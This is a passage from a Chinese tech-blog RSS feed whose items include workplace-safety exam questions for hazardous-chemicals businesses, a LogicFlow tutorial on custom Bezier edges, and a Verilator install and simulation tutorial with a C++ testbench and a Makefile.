1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:38 +0000</pubDate>
    </item>
    <item>
      <title>危化品经营单位（生产管理人员）考试试题及答案</title>
      <link>https://www.ppmy.cn/news/1540862.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维危化品经营单位（生产管理人员）考试试题及答案news/2025/10/31 23:18:36/危化品经营单位（生产管理人员）考试试题及答案76.生产经营单位应当组织开展本单位的（ ）,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。A.应急预案培训活动B.应急预案编制C.应急预案演练答案:A77.生产经营单位应当具备《安全生产法》和有关法律、行政法规和国家标准或者行业标准规定的（ ）。A.生产条件B.工作条件C.安全生产条件答案:C78.生产经营单位因兼并、重组、转制等导致隶属关系、经营方式、法定代表人发生变化的应急预案应当（ ）。A.不修订B.三年后修订C.及时修订答案:C79.生产经营单位新建、改建、扩建工程项目安全设施"三同时"评价工作,属于安全评价类型的（ ）。A.专项安全评价B.安全现状综合评价C.安全预评价和安全验收评价答案:C80.生产经营单位使用的危险物品的容器、运输工具,以及涉及人身安全、危险性较大的海洋石油开采特种设备和矿山井下特种设备,必须按照国家有关规定,由专业生产单位生产,并经具有专业资质的检测、检验机构检测、检验合格,取得（ ）,方可投入使用。检测、检验机构对检测、检验结果负责。A.安全使用证或者安全标志B.安全标志或安全生产合格证C.质量合格标志答案:A81.生产经营单位的安全生产责任制的实质是（ ）。A.安全生产,人人有责B.安全第一,预防为主C.管生产必须同时管安全答案:A82.生产经营单位（ ）对本单位事故隐患排查治理工作全面负责。A.高层领导B.安全分管领导C.主要负责人答案:C83.生产过程职业病危害因素中的（ ）属于化学因素。A.病毒B.真菌C.有毒物质答案:C84.生产、储存、经营其他物品的场所与居住场所设置在同一建筑物内的,应当符合国家工程建设（ ）技术标准。A.安全B.环保C.消防答案:C85.申请剧毒化学品和其他危险化学品经营许可证的企业和单位,（ ）具有资质的安全评价机构对本单位的经营条件进行安全评价。A.由安全监督部门指定的B.自主选择C.由公安部门定点的答案:Bhttp://www.ppmy.cn/news/1540862.html相关文章六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:37 +0000</pubDate>
    </item>
    <item>
      <title>六、LogicFlow 自定义业务边 Edge</title>
      <link>https://www.ppmy.cn/news/1540861.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维六、LogicFlow 自定义业务边 Edgenews/2025/10/31 23:18:36/前言经过前面的文章讲解，目前已经实现了节点拖拽到画布中，并且也实现了节点之间的基础连线，到这里也算是入了门，接下来继续探究新学习新的功能，以满足新的需求，那么这一章就会学习如何更改两节点之间的连线问题，让线条变得更加好看，更加的形象生动，增加用户在使用过程中的体验。边的介绍根据官方介绍当前支持如下三种内置边：直线(line)直角折线(polyline)贝塞尔曲线(bezier)边引入方式// 直线import{LineEdge,PolylineEdgeModel}from"@logicflow/core";// 折线import{PolylineEdge,PolylineEdgeModel}from"@logicflow/core";// 贝塞尔曲线import{BezierEdge,BezierEdgeModel}from"@logicflow/core";改造边（线）基于之前的配置，mock两个节点和边的数据，如下所示：实现效果如下：然后我们这次的目标就是通过修改边的一些属性来优化连线的样式，让其变得更加的好看舒适，符合系统的整体视觉效果。自定义边目录介绍在合适的位置创建曲线文件，我这里还是跟创建自定义节点同一目录层级，如下所示：这次需要改动的就是上图中圈起来的文件，这里按照引入的顺序简单介绍一下：Edges 自定义的线条Register.js 注册线条index.vue 引入并使用线条创建自定义边目录文件在Edges目录下创建Bezier.js文件， 根据官网介绍引入贝塞尔曲线（bezier）相关内置。// 贝塞尔曲线import{BezierEdge,BezierEdgeModel}from'@logicflow/core'// 贝塞尔曲线classcustomBezierEdgeModelextendsBezierEdgeModel{constructor(data,graphModel){super(data,graphModel);}// 。。。其他属性配置}/*** 和节点一样，LogicFlow 的边也支持基于继承的自定义机制。* 同样也只需同时继承view和model。 * 但是和节点不一样的是，由于边的编辑复杂度问题，绝大多数情况下，自定义边时不推荐自定义view。 * 只需要在自定义edgeModel中样式类即可。
*/exportdefault{// 自定义曲线类型type:'EDGE_BEZIER',view:BezierEdge,model:customBezierEdgeModel,};注册这里的注册跟前面章节中注册节点的方式一样，在Register.js文件中如下配置：// 自定义贝塞尔曲线importBezierfrom'./Edges/Bezier';exportconstRegisterCustomElement=(lf)=&gt;{// 。。。注册的节点// 自定义贝塞尔曲线lf.register(Bezier);};使用基于前一章节在index.vue文件中，基本不用做什么改动，为了记忆，这里再次描述一下。&lt;script&gt;// 引入LogicFlow核心包importLogicFlowfrom'@logicflow/core';import'@logicflow/core/dist/style/index.css';// 引入组件importLeftMenufrom'./components/LeftMenu';// 注册自定义节点import{RegisterCustomElement}from'./lf_omponents/Register';exportdefault({name:'demo',data(){return{lf:null,taskDetail:{},// 模拟数据mockData:{nodes:[{id:"1",type:"rect",x:100,y:100,text:"节点1"},{id:"2",type:"circle",x:500,y:300,text:"节点2"},],edges:[{sourceNodeId:"1",targetNodeId:"2",type:"EDGE_BEZIER",// 此处改为自定义曲线类型text:"连线",startPoint:{x:140,y:100,},endPoint:{x:450,y:300,},},],}}},components:{LeftMenu,},mounted(){constthat=this;// 创建实例constlf=newLogicFlow({container:this.$refs.diagram,// ... 其他的一些配置background:{// 画布背景配置}});// 存储全局对象，便于其他地方使用到 LogicFlow 实例对象that.lf=lf;// *********** 重点：注册自定义节点和边 ***************RegisterCustomElement(lf);/* 开启渲染如果不要模拟数据，直接使用 lf.render() 即可。**/lf.render(this.mockData);// 渲染到视图中心为止，否则在左上角显示lf.translateCenter();},methods:{// 拖拽节点$_dragInNode(data){constthat=this;that.lf.dnd.startDrag({...data,});},}})&lt;/script&gt;基础效果稍微修改一下之前的mock数据，如下所示：到这里的时候，就能够看得出效果了，左测是之前的边（polyline），右侧是自定义边（EDGE_BEZIER）到这里，我们的目的基本就达成了，接下来修改线条的颜色等配置接下来的所有的改动都是基于Bezier.js文件内容进行修改。Bezier.js配置修改启动动画在Bezier.js文件中通过setAttributes函数让边动起来，形成有流动效果，因为这里是截图，所以看不出来，自己可以在项目中尝试。classModelextendsBezierEdgeModel{constructor(data,graphModel){super(data,graphModel);}setAttributes(){// 启动动画this.isAnimation=true;}}如下效果：结语其他的一些配置修改，这里就不过多赘述，自己根据官网描述自行尝试。如果对你还有点作用，请点赞，收藏。http://www.ppmy.cn/news/1540861.html相关文章Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:36 +0000</pubDate>
    </item>
    <item>
      <title>Verilator——最简单、最细节上手教程</title>
      <link>https://www.ppmy.cn/news/1540860.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Verilator——最简单、最细节上手教程news/2025/10/31 23:18:35/目录前言工具安装Verilator 安装GTKwave 安装Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用Verilator 的进阶使用与GDB搭配与makefile搭配Verilator 的高阶用法访问模块内部数据前言此教程会以ubuntu22.04为例从如何安装，到如何使用全程帮助你学习和使用verilator狂肝3h，倾心之作如有笔误、问题，欢迎指出、讨论~点赞，收藏，长期翻看~工具安装Verilator 安装利用git进行快速安装（安装方法摘自官网Verilator）# 安装的前提:sudoapt-getinstallgithelp2man perl python3makeautoconf g++ flex bison ccachesudoapt-getinstalllibgoogle-perftools-dev numactl perl-docsudoapt-getinstalllibfl2# 只有Ubuntu需要，如果报错就忽略sudoapt-getinstalllibfl-dev# 只有Ubuntu需要，如果报错就忽略sudoapt-getinstallzlibc zlib1g zlib1g-dev# 只有Ubuntu需要，如果报错就忽略gitclone https://github.com/verilator/verilator#只需克隆一次# Every time you need to build:unsetenv VERILATOR_ROOT# 对csh操作，如果是使用bash就忽略unsetVERILATOR_ROOT# 对bash操作cdverilatorgitpull# 确保git的仓库是最新的gittag# 查看可选版本#选择以下的其中一个执行：#git checkout master      # 使用开发分支（例如最近的bug修复版本）#git checkout stable      # 使用最新的稳定版本#git checkout v{version}  # 切换到指定版本autoconf# 创建脚本./configure# 配置并创建makefilemake-j`nproc`# 构建verilator （如果报错试试只输入“make”）sudomakeinstall然后执行verilator --version#检查版本，检查是否安装成功GTKwave 安装用来查看verilator生成的波形文件有两种安装方法：直接从ubuntu自带的应用商城搜索gtkwave，即可安装使用apt-get命令来安装sudoapt-getinstallgtkwave
gtkwave --version	//查看版本，检查是否安装成功Verilator 基础用法fst格式和vcd格式的wave文件varilator可以生成两种格式的wave文件：fst格式FST格式的波形文件大致是VCD格式的1/50该格式只能用gtkwave打开，其他波形查看软件不支持vcd格式文件大小较大可以用多种波形查看软件查看鉴于fst格式的优点，以及网上很少关于生成fst格式的教程，因此我以生成fst为例，如若要生成vcd可以上网查阅资料接下来我将介绍如何使用verilatorVerilator 的使用以cpp为例，并介绍如何生成fst wave文件的生成可以看官方的例程 ：官方c++例程此处我挑出其中重点的部分来讲解假设我们用verilog写一个双控开关：//顶层文件名为top，因此等会include的头文件为Vtop
//若顶层文件名为example，则include的头文件名为Vexample
module top(input clk，input rst，input a,input b,output f
);assign f = a ^ b;
endmodule仿真过程用c++来描述，文件如下：//与verilator无关的一些头文件#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt;//使用verilater必须include#include"Vtop.h"//仿真模型的头文件，由top.v生成，如果顶层文件名更改则也需要更改#include&lt;verilated.h&gt;#defineCONFIG_FST_WAVE_TRACE1// contextp用来保存仿真的时间VerilatedContext*contextp=newVerilatedContext;// 构建一个名为top的仿真模型Vtop*top=newVtop{contextp};//如果生成FST格式的wave#ifCONFIG_FST_WAVE_TRACE#include"verilated_fst_c.h"//波形文件所需的头文件VerilatedFstC*tfp=newVerilatedFstC;// 创建一个波形文件指针#endif//仿真的过程intmain(intargc,char**argv){Verilated::mkdir("build/logs");// 创建一个日志文件夹// 传递参数给verilatorcontextp-&gt;commandArgs(argc,argv);//如果生成FST格式的wave#ifCONFIG_FST_WAVE_TRACEcontextp-&gt;traceEverOn(true);// 启用跟踪top-&gt;trace(tfp,99);// 采样深度为99tfp-&gt;open("build/logs/cpu_wave.fst");// 打开波形文件，文件地址和文件名可以自定义#endif/***************对top端口的初始化*******************/top-&gt;clk=0;top-&gt;rst=0;/**************verilator的仿真循环*****************/while(!contextp-&gt;gotFinish())// ctrl+c 可以停止仿真{/************设置vtop仿真的输入信号************/inta=rand()&amp;1;intb=rand()&amp;1;top-&gt;a=a;top-&gt;b=b;top-&gt;clk=!top-&gt;clk;// 随着仿真时间倒转clk，产生时钟周期top-&gt;eval();//更新电路状态printf("a = %d, b = %d, f = %d\n",a,b,top-&gt;f);//按需打印想要的contextp-&gt;timeInc(1);//推动仿真时间#ifCONFIG_FST_WAVE_TRACEtfp-&gt;dump(contextp-&gt;time());// 按照时间采样#endif}/*****************仿真结束，一些善后工作***************/#ifCONFIG_FST_WAVE_TRACEtfp-&gt;close();// 关闭波形文件#endif// 清理top仿真模型，并销毁相关指针，并将指针变为空指针top-&gt;final();deletetop;top=nullptr;deletecontextp;contextp=nullptr;return0;}完成文件的编写后，我们要让verilator编译并运行在命令行中输入verilator -Wall top.v top_main.cpp --cc --trace-fst --exe --build
./obj_dir/Vtop   //必须执行这个，才运行仿真，生成波形
gtkwave build/logs/cpu_wave.fst	//用gtk打开波形文件Verilator 的进阶使用与GDB搭配gdb可以很方便得对仿真的过程进行调试如何使用请详见 “与makefile搭配”与makefile搭配如果每次使用verilator都要在命令行中输入以上命令，有点太麻烦了因此可以利用makefile########### 不要在变量后面加多余空格，否则会导致变量名出问题 ###########
########### 因此也不要在变量后面加注释，以避免上述情况发生 ############顶层文件的名字
TOPNAME = top#指定verilator
VERILATOR = verilator######################## 包含相关文件 ########################
#相关文件的地址
INCLUDE_PATH = ./build/chisel ./src/main/cpp/#对地址添加 -I的前缀
INCFLAGS = $(addprefix -I, $(INCLUDE_PATH))######################## cxx编译选项 ########################
CXXFLAGS += $(INCFLAGS) -DTOP_NAME="\"V$(TOPNAME)\""
#生成调试信息
CXXFLAGS += -g
#让错误信息带颜色，不知道有没有用
CXXFLAGS += -fdiagnostics-color=auto
CFLAGS_TRACE += -DITRACE_COND=$(if $(CONFIG_ITRACE_COND),$(call remove_quote,$(CONFIG_ITRACE_COND)),true)
CXXFLAGS  += $(CFLAGS_TRACE)######################## 链接器编译选项 ########################
#链接器的选项，包含readline库
LDFLAGS += -lreadline######################## 构建后的项目 ########################
#构建后的地址
BUILD_DIR = ./build/verilator#构建后文件存放的地址
OBJ_DIR = $(BUILD_DIR)/obj_dir#可执行文件的地址
BIN = $(OBJ_DIR)/$(TOPNAME)######################## verilator选项 ########################
#创建生成文件的目录,存放生成的文件
VERILATOR_CFLAGS += --Mdir $(OBJ_DIR)#优化分配 
VERILATOR_CFLAGS += -x-assign fast#将所有warning 变成error
VERILATOR_FLAGS += -Wall#Make waveforms,fst格式
VERILATOR_CFLAGS += --trace-fst#检查SystemVerilog断言
VERILATOR_CFLAGS += --assert#debug模式，生成更多调试信息
VERILATOR_FLAGS += --debug#Add this trace to get a backtrace in gdb
VERILATOR_FLAGS += --gdbbt# 可用gdb调试
VERILATOR_FLAGS += --gdb#加速编译
VERILATOR_CFLAGS += -j#包含verilog中include的文件地址
VERILATOR_CFLAGS += $(INCFLAGS)#使用DPI-C
VERILATOR_CFLAGS += --vpi#调用工具链来构建库，不加则由verilator自己构建
VERILATOR_CFLAGS += --build#指定顶层文件
VERILATOR_CFLAGS += --top-module $(TOPNAME)#将cxx参数传给gcc编译
VERILATOR_CFLAGS += $(addprefix -CFLAGS , $(CXXFLAGS))#将ld参数传给ld链接
VERILATOR_CFLAGS += $(addprefix -LDFLAGS , $(LDFLAGS))#生成C++可执行文件，并指定文件名字
VERILATOR_CFLAGS += --cc --exe -o $(abspath $(BIN))######################## 查找相关文件 ########################
VSRCS = $(shell find $(abspath ./build/chisel) -name "*.v" -or -name "*.sv")
CSRCS = $(shell find $(abspath ./src/main/cpp) -name "*.c" -or -name "*.cc" -or -name "*.cpp")run:@echo "-------- VERILATE --- AND --- BUILD --------"#清空再创建目的地目录@rm -rf $(OBJ_DIR)@mkdir -p $(OBJ_DIR)#执行命令@$(VERILATOR) $(VERILATOR_CFLAGS) $(VSRCS) $(CSRCS)@echo@echo "-------------------- RUN --------------------"#清空再创建波形文件夹并@rm -rf $(BUILD_DIR)/logs@mkdir -p $(BUILD_DIR)/logs#执行可执行文件，运行并仿真，生成波形@$(BIN) +trace@echo@echo "-------------------- DONE --------------------"@echo "To see waveforms, open $(BUILD_DIR)/logs/cpu_wave.fst in a waveform viewer"@echogdb:@echo "-------- VERILATE --- AND --- BUILD --------"#清空再创建目的地目录@rm -rf $(OBJ_DIR)@mkdir -p $(OBJ_DIR)#执行命令@$(VERILATOR) $(VERILATOR_CFLAGS) $(VSRCS) $(CSRCS)@echo@echo "-------------------- GDB --------------------"#清空再创建波形文件夹并@rm -rf $(BUILD_DIR)/logs@mkdir -p $(BUILD_DIR)/logs#gbd执行可执行文件，运行并仿真，生成波形gdb -s $(BIN) --args $(BIN)@echo@echo "-------------------- DONE --------------------"@echo "To see waveforms, open $(BUILD_DIR)/logs/cpu_wave.fst in a waveform viewer"@echo然后在当前目录下执行makerun	//执行仿真makegdb	//使用gdb即可Verilator 的高阶用法访问模块内部数据前面的介绍中，我们要访问模块的数据，只能访问到顶层模块top的输入输出端口，假如我要访问其中内部的wire和reg数据该怎么办呢？verilator为在将verilog文件编译为cpp文件进行仿真的时候，我们可以在仿真文件中访问verilator将.v文件转化后的cpp文件来访问数据只需在上面的仿真文件中增加以下内容#include"../build/obj_dir/Vtop___024root.h"//然后就可以通过top来访问了printf("data:%x",top-&gt;rootp-&gt;top__DOT__my_regfile__DOT__reg_f[1])//my_regfile为实例化的模块名//reg_f为模块中定义的reg型//若你想输出你想要的数据可以在 ../build/obj_dir/Vtop___024root.h 头文件中寻找http://www.ppmy.cn/news/1540860.html相关文章oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...SQL数据库刷题sql_day34(移动平均值、累计求和)描述 移动平均值 1.求不同产品 每个月以及截至当前月最近3个月的平均销售额 2.求不同产品截至当前月份的累计销售额 数据准备 mysql CREATE TABLE sales_monthly (product VARCHAR(20),ym VARCHAR(10),amount DECIMAL(10,2)
);-- 插入测试数据
INSERT INTO sales_monthly (prod…阅读更多...植物大战僵尸杂交版游戏分享植物大战僵尸杂交版游戏下载&amp;#xff1a;夸克网盘分享 
无捆绑之类的隐形消费&amp;#xff0c;下载即玩阅读更多...Linux系统基础-文件系统个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 Linux系统基础-文件系统 收录于专栏[Linux学习] 本专栏旨在分享学习Linux的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c; 目录 1. 回顾C语言…阅读更多...VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:35 +0000</pubDate>
    </item>
    <item>
      <title>oracle中的exists 和not exists 用法</title>
      <link>https://www.ppmy.cn/news/1540859.html</link>
